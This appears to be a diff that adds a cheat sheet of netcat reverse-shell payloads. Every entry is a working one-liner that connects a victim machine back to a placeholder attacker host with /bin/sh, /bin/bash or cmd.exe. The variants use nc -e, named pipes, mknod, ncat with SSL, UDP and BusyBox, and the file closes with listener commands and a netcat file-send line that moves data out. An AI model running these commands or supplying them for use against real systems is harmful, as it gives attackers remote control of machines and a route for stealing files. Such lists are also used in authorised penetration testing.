@@ -1,0 +1,56 @@
+# Netcat Reverse Shells
+
+# Traditional netcat with -e
+nc -e /bin/sh ATTACKER_IP PORT
+nc -e /bin/bash ATTACKER_IP PORT
+nc -e cmd.exe ATTACKER_IP PORT
+
+# Netcat GNU version with -c
+nc -c /bin/sh ATTACKER_IP PORT
+nc -c /bin/bash ATTACKER_IP PORT
+
+# OpenBSD netcat (no -e option) - using named pipe
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+# Netcat without -e - two port method
+# On attacker: nc -lvnp 4444
+# On attacker: nc -lvnp 4445
+# On victim:
+nc ATTACKER_IP 4444 | /bin/sh | nc ATTACKER_IP 4445
+
+# Netcat BSD without -e
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
+
+# Netcat with mknod
+mknod backpipe p; nc ATTACKER_IP PORT 0<backpipe | /bin/bash 1>backpipe 2>backpipe
+
+# Ncat (Nmap's netcat) with SSL
+ncat --ssl ATTACKER_IP PORT -e /bin/bash
+
+# Ncat with verbose
+ncat -v ATTACKER_IP PORT -e /bin/sh
+
+# Netcat Windows
+nc.exe -e cmd.exe ATTACKER_IP PORT
+nc.exe ATTACKER_IP PORT -e cmd.exe
+
+# Netcat UDP reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u ATTACKER_IP PORT >/tmp/f
+
+# Netcat with exec (alternative to -e)
+nc ATTACKER_IP PORT -c 'exec /bin/bash -i'
+
+# BusyBox netcat (limited options)
+busybox nc ATTACKER_IP PORT -e /bin/sh
+
+# Listener examples:
+# Basic: nc -lvnp 4444
+# With readline: rlwrap nc -lvnp 4444
+# Ncat with SSL: ncat --ssl -lvnp 4444
+
+# File transfer with netcat:
+# Receive: nc -lvnp 4444 > file
+# Send: nc -w 3 ATTACKER_IP 4444 < file
+
+
+
